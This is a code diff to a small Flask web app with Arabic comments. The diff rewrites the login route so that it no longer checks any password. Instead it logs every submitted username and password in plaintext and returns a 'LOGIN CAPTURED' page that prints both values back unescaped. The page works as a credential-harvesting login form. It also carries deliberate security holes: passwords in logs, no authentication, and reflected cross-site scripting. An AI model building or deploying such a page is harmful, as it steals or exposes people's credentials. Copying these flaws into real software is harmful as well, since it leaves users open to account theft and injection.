@@ -26,21 +26,25 @@ def log_request_info():
 def home():
     return "<h1>Home Page</h1>"
 
-# تسجيل الدخول
+# تسجيل الدخول (🔥 معدل)
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
 
-        logging.info("====== LOGIN ATTEMPT ======")
-        logging.info(f"Username: {username}")
-        logging.info(f"Password: {password}")
+        # 🔥 طباعة قوية في logs
+        logging.warning("====== LOGIN ATTEMPT ======")
+        logging.warning(f"Username: {username}")
+        logging.warning(f"Password: {password}")
 
-        if username == "admin" and password == "1234":
-            return redirect("/dashboard")
-        else:
-            return "Login Failed"
+        # 🔥 عرض مباشر للتأكيد 100%
+        return f"""
+        <h2>LOGIN CAPTURED ✅</h2>
+        <p>Username: {username}</p>
+        <p>Password: {password}</p>
+        <a href="/dashboard">Go to Dashboard</a>
+        """
 
     return '''
     <form method="POST" action="/login">
@@ -59,7 +63,6 @@ def dashboard():
 @app.route('/logout')
 def logout():
     return redirect('/login')
-
 
 # تشغيل مناسب لـ Render
 if __name__ == "__main__":
